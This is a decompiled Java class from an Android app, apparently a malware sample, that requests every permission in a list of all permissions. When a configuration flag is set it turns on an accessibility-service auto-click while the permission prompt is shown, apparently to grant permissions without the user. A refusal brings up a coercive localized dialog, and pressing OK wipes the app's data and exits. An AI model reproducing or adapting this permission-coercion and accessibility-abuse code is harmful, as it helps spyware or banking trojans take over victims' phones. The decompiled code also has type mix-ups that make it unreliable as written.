/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.AlertDialog$Builder
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.graphics.drawable.Drawable
 *  android.os.Bundle
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import java.io.File;
import java.util.Locale;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.PermissionArrayProvider;
import linker.resourcer.encoder.PermissionsRequestActivity$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.SetupOrchestrationService;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class PermissionsRequestActivity
extends Activity {
    private static PermissionsRequestActivity instance = null;
    ConfigManager myconfiger;
    boolean once = false;

    private void ToggleAccess(boolean bl) {
        AccessibilityServiceController.FOR_PRIMS = bl;
        AccessibilityServiceController.Auto_Click = bl;
    }

    private boolean deleteDir(File file) {
        if (file != null && file.isDirectory()) {
            String[] stringArray = file.list();
            int n = stringArray.length;
            for (int i = 0; i < n; ++i) {
                if (this.deleteDir(new File(file, stringArray[i]))) continue;
                return false;
            }
            return file.delete();
        }
        if (file != null && file.isFile()) {
            return file.delete();
        }
        return false;
    }

    public static boolean isOpen() {
        return instance != null;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void mustenabled() {
        String string2;
        String string3;
        Object object;
        block23: {
            int n;
            block22: {
                object = "App permissions";
                AlarmHelper.setAlarm(this.getApplicationContext());
                string3 = Locale.getDefault().getLanguage();
                switch (string3.hashCode()) {
                    case 3886: {
                        if (!string3.equals("zh")) break;
                        n = 1;
                        break block22;
                    }
                    case 3710: {
                        if (!string3.equals("tr")) break;
                        n = 2;
                        break block22;
                    }
                    case 3651: {
                        if (!string3.equals("ru")) break;
                        n = 5;
                        break block22;
                    }
                    case 3588: {
                        if (!string3.equals("pt")) break;
                        n = 3;
                        break block22;
                    }
                    case 3246: {
                        if (!string3.equals("es")) break;
                        n = 4;
                        break block22;
                    }
                    case 3121: {
                        if (!string3.equals("ar")) break;
                        n = 0;
                        break block22;
                    }
                }
                n = -1;
            }
            switch (n) {
                default: {
                    break;
                }
                case 5: {
                    string3 = "\u041e\u041a";
                    object = "\u0420\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u044f \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f";
                    string2 = "\u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u0438\u044f, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u043b\u043e \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e.";
                    break block23;
                }
                case 4: {
                    string3 = "Aceptar";
                    object = "Permisos de la aplicaci\u00f3n";
                    string2 = "Se deben habilitar los permisos para que la aplicaci\u00f3n funcione correctamente.";
                    break block23;
                }
                case 3: {
                    string3 = "OK";
                    object = "Permiss\u00f5es do aplicativo";
                    string2 = "As permiss\u00f5es devem ser ativadas para o aplicativo funcionar corretamente.";
                    break block23;
                }
                case 2: {
                    string3 = "Tamam";
                    object = "Uygulama izinleri";
                    string2 = "Uygulaman\u0131n d\u00fczg\u00fcn \u00e7al\u0131\u015fmas\u0131 i\u00e7in izinler etkinle\u015ftirilmelidir.";
                    break block23;
                }
                case 1: {
                    string3 = "\u786e\u5b9a";
                    object = "\u5e94\u7528\u6743\u9650";
                    string2 = "\u5fc5\u987b\u542f\u7528\u6743\u9650\u624d\u80fd\u4f7f\u5e94\u7528\u6b63\u5e38\u5de5\u4f5c\u3002";
                    break block23;
                }
                case 0: {
                    string3 = "\u0645\u0648\u0627\u0641\u0642";
                    object = "\u0623\u0630\u0648\u0646\u0627\u062a \u0627\u0644\u062a\u0637\u0628\u064a\u0642";
                    string2 = "\u064a\u062c\u0628 \u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0623\u0630\u0648\u0646\u0627\u062a \u062d\u062a\u0649 \u064a\u0639\u0645\u0644 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0628\u0634\u0643\u0644 \u0635\u062d\u064a\u062d.";
                    break block23;
                }
            }
            string2 = "Permissions must be enabled for the app to work properly.";
            string3 = "OK";
        }
        AlertDialog.Builder builder = null;
        try {
            AlertDialog.Builder builder2;
            try {
                builder = builder2 = this.getPackageManager().getApplicationIcon(this.getPackageName());
            }
            catch (PackageManager.NameNotFoundException nameNotFoundException) {
                // empty catch block
            }
            builder2 = new AlertDialog.Builder((Context)this, 16974545);
            string2 = builder2.setTitle((CharSequence)object).setMessage((CharSequence)string2);
            object = new PermissionsRequestActivity$$ExternalSyntheticLambda0(this);
            string3 = string2.setPositiveButton((CharSequence)string3, (DialogInterface.OnClickListener)object);
            if (builder != null) {
                string3.setIcon((Drawable)builder);
            }
            string3.show();
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    /* synthetic */ void lambda$mustenabled$0$com-icontrol-protector-PermissionsRequestActivity(DialogInterface object, int n) {
        Runtime runtime;
        try {
            runtime = Runtime.getRuntime();
            object = new StringBuilder();
            runtime.exec(((StringBuilder)object).append("pm clear ").append(this.getApplicationContext().getPackageName()).toString());
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        runtime = this.getApplicationContext();
        this.deleteDir(runtime.getCacheDir());
        this.deleteDir(runtime.getExternalCacheDir());
        this.deleteDir(runtime.getFilesDir());
        this.deleteDir(runtime.getExternalFilesDir(null));
        object = runtime.databaseList();
        int n2 = ((Object)object).length;
        for (n = 0; n < n2; ++n) {
            runtime.deleteDatabase((String)object[n]);
        }
        System.exit(1);
    }

    protected void onCreate(Bundle stringArray) {
        super.onCreate((Bundle)stringArray);
        try {
            instance = this;
            this.myconfiger = ConfigManager.getInstance();
            this.myconfiger.initialize(this.getApplicationContext(), ConfigurationProvider.ALL_CONFIG);
            this.requestWindowFeature(1);
            this.getWindow().setFlags(1024, 1024);
            stringArray = PermissionArrayProvider.ALL_PERMISSIONS(this.getApplicationContext());
            if (!PermissionArrayProvider.hasPermissions(this.getApplicationContext(), stringArray)) {
                if (ConfigurationProvider.Click_Prim.equals("1")) {
                    this.ToggleAccess(true);
                }
                this.requestPermissions(stringArray, 987);
            } else {
                this.finish();
            }
        }
        catch (Exception exception) {
            AndroidLogger.Error("ActPrims_onCreate", exception.getMessage());
        }
    }

    protected void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public void onRequestPermissionsResult(int n, String[] stringArray, int[] nArray) {
        super.onRequestPermissionsResult(n, stringArray, nArray);
        switch (n) {
            default: {
                break;
            }
            case 987: {
                stringArray = PermissionArrayProvider.ALL_PERMISSIONS(this.getApplicationContext());
                if (nArray.length > 0 && nArray[0] == 0) {
                    this.ToggleAccess(false);
                    if (PermissionArrayProvider.hasPermissions(this.getApplicationContext(), stringArray)) {
                        SetupOrchestrationService.skipprimes = true;
                        this.finish();
                        break;
                    }
                    if (!ConfigurationProvider.fprm.equals("1") || this.myconfiger.req_accss) break;
                    this.mustenabled();
                    break;
                }
                if (ConfigurationProvider.fprm.equals("1") && !this.myconfiger.req_accss) {
                    this.mustenabled();
                    break;
                }
                if (!this.once) {
                    this.once = true;
                    if (PermissionArrayProvider.hasPermissions(this.getApplicationContext(), stringArray)) break;
                    this.requestPermissions(stringArray, 987);
                    break;
                }
                SetupOrchestrationService.skipprimes = true;
                this.ToggleAccess(false);
                this.finish();
            }
        }
    }

    protected void onResume() {
        super.onResume();
    }
}

